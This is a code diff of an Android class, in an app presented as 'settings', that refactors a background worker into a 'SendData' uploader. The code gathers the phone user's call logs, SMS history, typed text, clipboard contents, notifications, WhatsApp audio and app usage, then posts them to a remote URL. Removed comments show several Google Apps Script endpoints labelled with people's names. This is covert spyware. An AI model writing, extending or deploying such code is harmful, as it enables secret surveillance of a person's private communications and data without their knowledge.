@@ -1,15 +1,9 @@
 package com.example.settings;
 
 import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
-import static com.example.settings.MainActivity.deviceInformation;
-import static com.example.settings.MainActivity.getCellInfo;
-import static com.example.settings.MainActivity.geturl;
 import static com.example.settings.MainActivity.setuponetimeworkManager;
-import static com.example.settings.MainActivity.simName;
 import static com.example.settings.Utils.checkpermission;
-import static com.example.settings.Utils.getAppDataHistory;
 import static com.example.settings.Utils.getDateTime;
-import static com.example.settings.Utils.getphoneAppdetails;
 import static com.example.settings.Utils.newUrlData;
 import static com.example.settings.Utils.setinfo;
 
@@ -37,35 +31,23 @@ import com.android.volley.toolbox.Volley;
 import java.util.HashMap;
 import java.util.Map;
 
-public class SyncOneTimeData extends Worker {
+public class SendData {
     Sharedpref mSharedpref;
     Context context;
     String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
             Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
             SmsData,OtherNotificationData,ClickedData,OtherClickedData,type="",AppUsageHistory,IssueDetails;
     String url="";
-    public SyncOneTimeData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
-        super(context, workerParams);
+    public SendData(Context context,String type) {
         mSharedpref = new Sharedpref(context);
         this.context = context;
+        this.type=type;
 
     }
 
     @RequiresApi(api = Build.VERSION_CODES.O)
-    @NonNull
-    @Override
-    public Result doWork() {
-        //saimaurl
-        type=getInputData().getString("Type");
+    public void doUpload() {
         url=mSharedpref.getUrl();
-        //url="https://script.google.com/macros/s/AKfycbwTSLIFqr1sjKmKw8LNHG4VxyRsiEYn87F3FkGnyse1Ey64ChtQ/exec";
-
-        /*Asima Url*/
-        //url="https://script.google.com/macros/s/AKfycbww2stEdxwyoiSedfbPLOCQrhWWJ29SPplLfFXEs1IwXDwZtSM/exec";
-
-        /*Abu ji Url*/
-        //url="https://script.google.com/macros/s/AKfycbzL-e8xcaMP3Cu5rcv1SIFgZdQ1ayEtBX7d6Bo5/exec";
-
         Name = mSharedpref.getSaveName();
         OutgoingNumbers = mSharedpref.getOutgoingNumbers();
         RecievedNumbers = mSharedpref.getRecievedNumbers();
@@ -84,7 +66,7 @@ public class SyncOneTimeData extends Worker {
         IssueDetails=mSharedpref.getOtherinfo();
         Utils.readSmsHistory(context,mSharedpref);
         Utils.getBatteryPercent(context,mSharedpref);
-        Utils.isPhoneIsLockedOrNot(context);
+       // Utils.isPhoneIsLockedOrNot(context);
         Utils.checkServices(context,mSharedpref);
         try {
             ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
@@ -146,7 +128,6 @@ public class SyncOneTimeData extends Worker {
                                     Log.d(context.getPackageName(),"Error");
                                     setinfo(mSharedpref,"Sync Ontime","From Volley Error");
                                     setuponetimeworkManager(context,"From Volley Error");
-                                    Result.retry();
 
                                 }
                             }
@@ -216,8 +197,6 @@ public class SyncOneTimeData extends Worker {
                                     Log.d(context.getPackageName(),"All empty Error");
                                     setinfo(mSharedpref,"Sync Ontime","From Volley Error When Name is Empty");
                                     setuponetimeworkManager(context,"From Volley Error When Empty");
-                                    Result.retry();
-
                                 }
                             }
                     ) {
@@ -257,7 +236,6 @@ public class SyncOneTimeData extends Worker {
                             parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
                             parmas.put("AppUsages",AppUsageHistory);
                             parmas.put("IssueDetails",IssueDetails);
-
                             return parmas;
                         }
                     };
@@ -273,7 +251,6 @@ public class SyncOneTimeData extends Worker {
             }
             else {
                 Log.d(context.getPackageName(),"Name empty");
-                Result.retry();
 
             }
         }
@@ -282,6 +259,5 @@ public class SyncOneTimeData extends Worker {
             setinfo(mSharedpref,"Sync Ontime","Internet Not Available");
         }
 
-        return Result.success();
     }
 }
